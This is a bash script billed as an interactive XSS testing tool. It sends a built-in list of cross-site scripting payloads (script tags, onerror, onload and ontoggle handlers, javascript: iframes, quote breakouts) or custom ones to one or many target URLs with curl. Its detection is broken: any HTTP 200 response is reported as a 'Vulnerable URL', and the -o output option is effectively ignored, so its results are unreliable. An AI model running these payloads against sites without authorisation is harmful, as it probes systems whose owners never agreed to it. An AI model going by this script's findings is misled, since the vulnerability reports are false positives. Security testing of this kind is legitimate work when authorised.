#!/bin/bash

# Interactive XSS Testing Tool
# Features:
# 1. Test a single URL or multiple URLs from a file.
# 2. Use default payloads or custom payloads from a file.
# 3. Save results automatically with timestamped filenames.
# 4. Clear, well-designed output for better readability.

# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Default payloads for XSS testing
DEFAULT_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Default output file
DEFAULT_OUTPUT_FILE="xss_results_$(date +'%Y%m%d_%H%M%S').txt"

# Display header
header() {
    echo -e "${BLUE}"
    echo "============================================"
    echo "        Interactive XSS Testing Tool        "
    echo "============================================"
    echo -e "${NC}"
}

# Display help information
help() {
    echo -e "${YELLOW}"
    echo "Usage:"
    echo "  This tool will guide you step by step to test for XSS vulnerabilities."
    echo "  You can test a single URL or multiple URLs from a file."
    echo "  You can also use default payloads or provide custom payloads."
    echo ""
    echo "Options:"
    echo "  -h, --help       Display this help menu."
    echo "  -u, --url        Test a single URL."
    echo "  -f, --file       Test multiple URLs from a file."
    echo "  -p, --payloads   Use custom payloads from a file."
    echo "  -o, --output     Specify output file (default: auto-generated)."
    echo ""
    echo "Example:"
    echo "  $0 -u \"https://example.com/search?q=\""
    echo "  $0 -f urls.txt -p payloads.txt"
    echo -e "${NC}"
    exit 0
}

# Function to URL-encode a string
url_encode() {
    local input=$1
    echo -n "$input" | jq -sRr @uri
}

# Function to test a URL with payloads (Fixed)
test_xss() {
    local url=$1
    shift  # Shift past the URL to access the payload array
    local payloads=("$@")  # Capture all remaining arguments as an array
    local output_file="$DEFAULT_OUTPUT_FILE"  # Use the global output file

    echo -e "${BLUE}Testing URL: $url${NC}"
    echo "Testing URL: $url" >> "$output_file"
    echo "-----------------------------------" >> "$output_file"

    for payload in "${payloads[@]}"; do
        if [ -z "$payload" ]; then
            continue
        fi

        encoded_payload=$(url_encode "$payload")
        test_url="${url}${encoded_payload}"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")

        if [[ $response -eq 200 ]]; then
            echo -e "${GREEN}[+] Vulnerable URL: $test_url${NC}"
            echo -e "${GREEN}    Payload: $payload${NC}"
            echo "[+] Vulnerable URL: $test_url" >> "$output_file"
            echo "    Payload: $payload" >> "$output_file"
        else
            echo -e "${RED}[-] Not vulnerable: $payload${NC}"
            echo "[-] Not vulnerable: $test_url with payload: $payload" >> "$output_file"
        fi
    done

    echo "" >> "$output_file"
}

# Main function
main() {
    header

    # Parse command-line options
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                help
                ;;
            -u|--url)
                URL="$2"
                shift 2
                ;;
            -f|--file)
                URL_FILE="$2"
                shift 2
                ;;
            -p|--payloads)
                PAYLOAD_FILE="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_FILE="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                help
                exit 1
                ;;
        esac
    done

    # Validate inputs
    if [ -z "$URL" ] && [ -z "$URL_FILE" ]; then
        echo -e "${RED}Error: You must specify a URL (-u) or a file with URLs (-f).${NC}"
        help
        exit 1
    fi

    # Use default output file if not specified
    OUTPUT_FILE=${OUTPUT_FILE:-$DEFAULT_OUTPUT_FILE}

    # Load payloads
    if [ -n "$PAYLOAD_FILE" ]; then
        if [ ! -f "$PAYLOAD_FILE" ]; then
            echo -e "${RED}Error: Custom payloads file '$PAYLOAD_FILE' not found.${NC}"
            exit 1
        fi
        mapfile -t PAYLOADS < "$PAYLOAD_FILE"
    else
        PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
    fi

    # Load URLs
    if [ -n "$URL_FILE" ]; then
        if [ ! -f "$URL_FILE" ]; then
            echo -e "${RED}Error: URLs file '$URL_FILE' not found.${NC}"
            exit 1
        fi
        mapfile -t URL_LIST < "$URL_FILE"
    else
        URL_LIST=("$URL")
    fi

    # Clear the output file if it exists
    > "$OUTPUT_FILE"

    # Start testing
    echo -e "${BLUE}Starting XSS testing...${NC}"
    for url in "${URL_LIST[@]}"; do
        test_xss "$url" "${PAYLOADS[@]}"
    done

    echo -e "${BLUE}============================================${NC}"
    echo -e "${GREEN}XSS Testing Completed. Results saved to:${NC}"
    echo -e "${YELLOW}$OUTPUT_FILE${NC}"
    echo -e "${BLUE}============================================${NC}"
}

# Run the script
main "$@"
